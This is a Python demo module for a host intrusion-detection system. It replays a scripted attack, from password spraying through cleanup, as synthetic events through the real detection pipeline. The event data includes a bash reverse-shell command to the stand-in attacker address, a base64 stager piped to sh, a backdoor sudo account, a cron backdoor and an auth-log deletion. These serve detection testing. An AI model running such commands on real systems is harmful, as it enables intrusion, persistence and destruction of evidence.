"""A scripted intrusion, replayed through the real detection pipeline.

``sentinel demo`` exists so anyone can watch the system work in seconds — no
root, no Docker, no live attack. Nothing here is mocked: a collector feeds raw,
pre-normalization records (exactly what the auth-log, process, file-integrity
and network collectors produce) through the real :class:`Normalizer`, bounded
queue, dedup window, rule library, alert manager and a throwaway SQLite
database, via the same :class:`~sentinel.runtime.Runtime` the service runs.

The story follows one attacker (203.0.113.7, a documentation address) from
password spraying to persistence and cleanup, interleaved with benign activity
that must stay silent, plus a re-read duplicate that the dedup window must drop.
"""

from __future__ import annotations

import asyncio
import tempfile
import time
from collections import Counter
from collections.abc import Sequence
from dataclasses import dataclass
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import TextIO

from sentinel.alerting import Alert, ConsoleSink
from sentinel.collectors.base import AbstractCollector
from sentinel.detection import Rule
from sentinel.metrics import Metrics
from sentinel.normalizer import (
    Normalizer,
    RawAuthEvent,
    RawEvent,
    RawFileEvent,
    RawNetworkEvent,
    RawProcessEvent,
)
from sentinel.pipeline import BoundedEventQueue
from sentinel.runtime import Runtime
from sentinel.settings import BackpressurePolicy, Environment, Settings
from sentinel.storage import Database, Repository

_HOST = "web01"
_ATTACKER = "203.0.113.7"
# Upper bound on the replay; it normally completes in well under a second.
_DEMO_TIMEOUT_S = 30.0
# Where the scripted attacker drops its payload. Only ever a string in an event.
_PAYLOAD = "/tmp/.x/kworker"  # noqa: S108  # nosec B108 — scenario data, not a temp file


@dataclass(frozen=True)
class Scenario:
    """The replayed timeline, and which of its records are benign."""

    records: tuple[RawEvent, ...]
    benign: tuple[RawEvent, ...]


def scenario(start: datetime) -> Scenario:
    """The scripted timeline: attack steps interleaved with benign activity."""
    at = [start + timedelta(seconds=i) for i in range(32)]

    def auth(i: int, action: str, outcome: str) -> RawAuthEvent:
        verb = "Failed" if outcome == "failure" else "Accepted"
        return RawAuthEvent(
            occurred_at=at[i], host=_HOST, syslog_ts=f"Jun 16 12:00:{i:02d}", pid=str(4100 + i),
            action=action, outcome=outcome, severity=4, user="root", ip=_ATTACKER,
            port=50000 + i,
            message=f"{verb} password for root from {_ATTACKER} port {50000 + i} ssh2",
        )  # fmt: skip

    def proc(i: int, cmdline: str, exe: str) -> RawProcessEvent:
        pid = 5000 + i
        return RawProcessEvent(
            occurred_at=at[i], host=_HOST, action="process_started", severity=3,
            pid=pid, ppid=4999, starttime=900_000 + pid, comm=Path(exe).name, cmdline=cmdline,
            executable=exe,
        )  # fmt: skip

    def file(i: int, action: str, path: str, mode: str) -> RawFileEvent:
        return RawFileEvent(
            occurred_at=at[i], host=_HOST, action=action, severity=4, path=path, size=512,
            mode=mode, sha256=None, id_seed=f"{path}@{i}",
        )  # fmt: skip

    def net(i: int, action: str, remote: tuple[str, int], state: str) -> RawNetworkEvent:
        return RawNetworkEvent(
            occurred_at=at[i], host=_HOST, action=action, severity=2, proto="tcp",
            local_ip="10.0.0.5", local_port=41_000 + i, remote_ip=remote[0],
            remote_port=remote[1], state=state, uid=0, inode=70_000 + i,
        )  # fmt: skip

    reverse_shell = f"bash -c 'bash -i >& /dev/tcp/{_ATTACKER}/4444 0>&1'"
    benign_worker = proc(0, "/usr/bin/python3 /opt/app/worker.py", "/usr/bin/python3")
    benign_https = net(1, "network_connection_opened", ("93.184.216.34", 443), "ESTABLISHED")
    benign_config = file(17, "file_modified", "/etc/app/settings.conf", "0644")
    cron_drop = file(14, "file_created", "/etc/cron.d/backdoor", "0644")
    records: tuple[RawEvent, ...] = (
        benign_worker,
        benign_https,
        # 1. Password spraying against root (T1110), then the guess lands (T1078).
        *[auth(i, "ssh_login_failed", "failure") for i in range(2, 8)],
        auth(8, "ssh_login_succeeded", "success"),
        # 2. Reverse shell back to the attacker, and its C2 connection (T1059, T1571).
        proc(9, reverse_shell, "/usr/bin/bash"),
        net(10, "network_connection_opened", (_ATTACKER, 4444), "ESTABLISHED"),
        # 3. Run a base64-obfuscated stager, then a payload from /tmp (T1027, T1059).
        proc(11, "sh -c 'echo ZWNobyBwd25lZA== | base64 -d | sh'", "/usr/bin/dash"),
        # Simulated payload path (scenario data, never touched on disk).
        proc(12, _PAYLOAD, _PAYLOAD),
        # 4. Persistence: a backdoor account and a cron job (T1136, T1053).
        proc(13, "useradd -m -s /bin/bash -G sudo svc-backup", "/usr/sbin/useradd"),
        cron_drop,
        cron_drop,  # the same transition observed twice: the dedup window drops it
        # 5. Privilege-escalation helper: a binary made setuid (T1548).
        file(16, "file_attributes_modified", "/usr/local/bin/helper", "4755"),
        benign_config,
        # 6. Cover tracks: delete the auth log (T1070).
        file(18, "file_deleted", "/var/log/auth.log", "0640"),
    )
    return Scenario(records=records, benign=(benign_worker, benign_https, benign_config))


class ScenarioCollector(AbstractCollector):
    """Feeds raw records through the real normalizer, then idles until stopped."""

    name = "demo-replay"

    def __init__(self, records: Sequence[RawEvent]) -> None:
        super().__init__()
        self._records = records
        self._normalizer = Normalizer()

    async def run(self, queue: BoundedEventQueue) -> None:
        for raw in self._records:
            event = self._normalizer.normalize(raw)
            if event is not None:
                await queue.put(event)
        await self.wait_stop()


@dataclass(frozen=True)
class DemoResult:
    """What the replay produced, for the summary and for tests."""

    replayed: int
    persisted_events: int
    alerts: tuple[Alert, ...]
    duplicates_dropped: int
    benign_events: int
    alerts_on_benign: int


class _Collecting(ConsoleSink):
    """Console output plus an in-memory record of every delivered alert."""

    def __init__(self, stream: TextIO | None) -> None:
        super().__init__(stream=stream)
        self.alerts: list[Alert] = []

    async def emit(self, alert: Alert) -> None:
        self.alerts.append(alert)
        await super().emit(alert)


async def run_demo(rules: Sequence[Rule], *, stream: TextIO | None = None) -> DemoResult:
    """Replay the scenario through `rules` end to end; return what was detected and stored."""
    script = scenario(datetime.now(tz=UTC).replace(microsecond=0))
    unique = len(_event_ids(script.records))
    benign_ids = _event_ids(script.benign)
    sink = _Collecting(stream)
    metrics = Metrics()
    with tempfile.TemporaryDirectory(prefix="sentinel-demo-") as tmp:
        database = Database(f"sqlite+aiosqlite:///{Path(tmp) / 'demo.db'}")
        await database.create_all()
        runtime = Runtime(
            # Self-contained: model_construct reads neither the environment nor a
            # .env file, so a service's exported SENTINEL_* variables (an alert
            # floor, a dropping queue, a typo) cannot change or break the story.
            Settings.model_construct(
                env=Environment.DEVELOPMENT,
                queue_maxsize=10_000,
                queue_backpressure=BackpressurePolicy.BLOCK,
                persist_flush_interval_seconds=0.05,
                # The scenario includes a log wipe under /var/log: declare it
                # watched, as a deployment running log-tampering would.
                fim_paths="/etc,/var/spool/cron,/var/log",
            ),
            database=database,
            metrics=metrics,
            rules=rules,
            collectors=[ScenarioCollector(script.records)],
            sinks=[sink],
        )
        runtime.start()
        deadline = time.monotonic() + _DEMO_TIMEOUT_S
        try:
            # Stop polling once every event is analyzed, the pipeline has died, the
            # replay collector has failed (it would be restarted, but the story is
            # over), or the deadline passes — the summary then reports what happened.
            while (  # noqa: ASYNC110 — polls a counter; no completion hook exists
                metrics.events_ingested._value.get() < unique
                and runtime.running
                and not runtime.snapshot().collector_restarts
                and time.monotonic() < deadline
            ):
                await asyncio.sleep(0.01)
        finally:
            await runtime.stop()
        async with database.session() as session:
            persisted = await Repository(session).count_events()
        await database.dispose()
    return DemoResult(
        replayed=len(script.records),
        persisted_events=persisted,
        alerts=tuple(sink.alerts),
        duplicates_dropped=runtime.snapshot().dropped["duplicate"],
        benign_events=len(benign_ids),
        alerts_on_benign=sum(alert.event_id in benign_ids for alert in sink.alerts),
    )


def _event_ids(records: Sequence[RawEvent]) -> set[str]:
    normalizer = Normalizer()
    return {event.event.id for raw in records if (event := normalizer.normalize(raw))}


def summarize(result: DemoResult) -> str:
    """A short, human-readable recap of the replay."""
    per_rule = Counter(alert.rule_id for alert in result.alerts)
    techniques = sorted({t for alert in result.alerts for t in alert.attack})
    lines = [
        "",
        f"Replayed {result.replayed} records -> {result.persisted_events} events stored "
        f"({result.duplicates_dropped} duplicate dropped by the dedup window).",
        f"{len(result.alerts)} alerts from {len(per_rule)} rules; "
        f"{result.alerts_on_benign} alerts on the {result.benign_events} benign events.",
        f"ATT&CK techniques detected: {', '.join(techniques)}",
    ]
    return "\n".join(lines)
